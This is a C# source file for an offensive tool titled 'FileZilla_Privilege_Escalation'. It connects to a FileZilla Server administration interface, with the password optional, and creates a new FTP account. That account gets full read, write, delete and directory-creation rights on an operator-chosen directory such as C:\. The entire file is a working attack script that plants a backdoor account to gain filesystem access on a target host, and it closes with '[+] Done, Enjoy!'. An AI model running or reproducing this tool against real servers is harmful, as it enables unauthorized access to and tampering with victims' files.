using System;
using System.Collections.Generic;
using System.Net;
using CommandLine;
using Miracle.FileZilla.Api;

namespace FileZilla_Privilege_Escalation
{
    class Program
    {
        public class Options
        {
            [Option('t', "target", Required = true, HelpText = "FileZilla Server Interface IP.")]
            public string Target { get; set; }
            [Option('p', "port", Required = true, HelpText = "FileZilla Server Interface port.")]
            public int Port { get; set; }
            [Option("password", Required = false, HelpText = "FileZilla Server Interface password.")]
            public string Password { get; set; }
            [Option("set-username", Required = true, HelpText = "FTP username which you want to create.")]
            public string SetUsername { get; set; }
            [Option("set-password", Required = true, HelpText = "FTP password which you want to create.")]
            public string SetPassword { get; set; }
            [Option("set-dir", Required = true, HelpText = "FTP user home dir(e.g. C:\\).")]
            public string SetDir { get; set; }
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Author: Hzllaga");
            Console.WriteLine("Github: https://github.com/Hzllaga");
            Console.WriteLine();
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o =>
                {
                    var fileZillaApi = new FileZillaApi(IPAddress.Parse(o.Target), o.Port);
                    try
                    {
                        fileZillaApi.Connect(o.Password);
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Connect error: ");
                        Console.WriteLine(e.Message);
                        return;
                    }
                    Console.WriteLine("[+] Connected.");
                    var accountSettings = fileZillaApi.GetAccountSettings();
                    var user = new User
                    {
                        UserName = o.SetUsername,
                        SharedFolders = new List<SharedFolder>()
                        {
                            new SharedFolder()
                            {
                                Directory = o.SetDir,
                                AccessRights = AccessRights.DirList | AccessRights.DirSubdirs | AccessRights.FileRead | AccessRights.FileWrite | AccessRights.IsHome | AccessRights.FileAppend | AccessRights.AutoCreate | AccessRights.DirCreate | AccessRights.DirDelete | AccessRights.FileDelete
                            }
                        }
                    };
                    user.AssignPassword(o.SetPassword, fileZillaApi.ProtocolVersion);
                    accountSettings.Users.Add(user);
                    try
                    {
                        fileZillaApi.SetAccountSettings(accountSettings);
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Create error: ");
                        Console.WriteLine(e.Message);
                        return;
                    }
                    Console.WriteLine("[+] Done, Enjoy!");
                });
        }
    }
}
